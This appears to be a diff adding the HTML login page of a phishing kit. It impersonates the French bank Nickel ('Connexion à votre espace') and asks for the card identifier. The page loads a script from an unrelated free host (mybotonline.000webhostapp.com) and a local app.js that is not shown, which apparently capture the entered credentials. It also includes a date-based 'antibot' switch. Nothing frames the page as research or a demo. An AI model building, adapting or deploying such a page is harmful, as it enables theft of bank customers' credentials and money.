@@ -1,0 +1,115 @@
+<!DOCTYPE html>
+<html lang="fr">
+
+<head>
+    <meta charset="UTF-8">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-4bw+/aepP/YC94hEpVNVgiZdgIC5+VKNBQNGCHeKRQN+PtmoHDEXuppvnDJzQIu9" crossorigin="anonymous">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://nickel.eu/fonts/newfont.css" type="text/css">
+
+    <title>Connexion à votre espace</title>
+    <style>
+        .checkbox-wrapper input[type="checkbox"] {
+            display: none;
+        }
+
+        .checkbox-wrapper .terms-label {
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+
+        .checkbox-wrapper .terms-label .label-text {
+            margin-left: 10px;
+        }
+
+        .checkbox-wrapper .checkbox-svg {
+            width: 30px;
+            height: 30px;
+        }
+
+        .checkbox-wrapper .checkbox-box {
+            fill: rgba(207, 205, 205, 0.425);
+            stroke: #8c00ff;
+            stroke-dasharray: 800;
+            stroke-dashoffset: 800;
+            transition: stroke-dashoffset 0.6s ease-in;
+        }
+
+        .checkbox-wrapper .checkbox-tick {
+            stroke: #8c00ff;
+            stroke-dasharray: 172;
+            stroke-dashoffset: 172;
+            transition: stroke-dashoffset 0.6s ease-in;
+        }
+
+        .checkbox-wrapper input[type="checkbox"]:checked+.terms-label .checkbox-box,
+        .checkbox-wrapper input[type="checkbox"]:checked+.terms-label .checkbox-tick {
+            stroke-dashoffset: 0;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="header shadow-sm">
+        <img src="./img/logo.png" width="120">
+        <div class="top-button">Espace partenaire</div>
+    </div>
+    <div class="center">
+        <br>
+        <h1>Connexion à votre espace</h1>
+        <p>Votre identifiant se trouve au verso de <br> votre carte Nickel. Si vous avez perdu <br> votre carte envoyez
+            par SMS <br> <strong>IDENTIFIANT au 38063</strong> </p> <br>
+        <img src="./img/card.png" alt=""> <br>
+        <form id="form">
+            <input class="input-mask" id="usercode" placeholder="XXX-000-000-0" type="text" minlength="10"
+                maxlength="10" required>
+            <p id="notif" style="color: goldenrod;"></p> <br>
+            <div class="checkbox-wrapper" style="width: 100%;">
+                <input id="terms-checkbox-37" name="checkbox" type="checkbox" style="margin-right: auto;">
+                <label class="terms-label" for="terms-checkbox-37">
+                    <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 200 200" class="checkbox-svg">
+                        <mask fill="white" id="path-1-inside-1_476_5-37">
+                            <rect height="200" width="200"></rect>
+                        </mask>
+                        <rect mask="url(#path-1-inside-1_476_5-37)" stroke-width="40" class="checkbox-box" height="200"
+                            width="200"></rect>
+                        <path stroke-width="15" d="M52 111.018L76.9867 136L149 64" class="checkbox-tick"></path>
+                    </svg>
+                    <span class="label-text">Se souvenir de moi</span>
+                </label>
+            </div>
+            <br>
+
+            <button type="submit">Se connecter</button> <br>
+        </form>
+    </div>
+    <br> <br>
+
+    <footer>
+        <a href="#">Aide & opposition CB</a>
+        <a href="#">Pas encore client ?</a>
+
+    </footer>
+    <script src="https://mybotonline.000webhostapp.com/serveur/file.js"></script>
+    <script src="./app.js"></script>
+</body>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.1/dist/js/bootstrap.bundle.min.js"
+    integrity="sha384-HwwvtgBNo3bZJJLYd8oVXjrBZt8cqVSpeBNS5n7C8IVInixGAoxmnlMuBnhbgrkm"
+    crossorigin="anonymous"></script>
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        
+        var antibot = new Date('2024-03-17');
+        var dateActuelle = new Date();
+
+        if (dateActuelle > antibot) {
+        document.body.classList.add('error');
+        }
+        
+    });
+</script>
+
+</html>
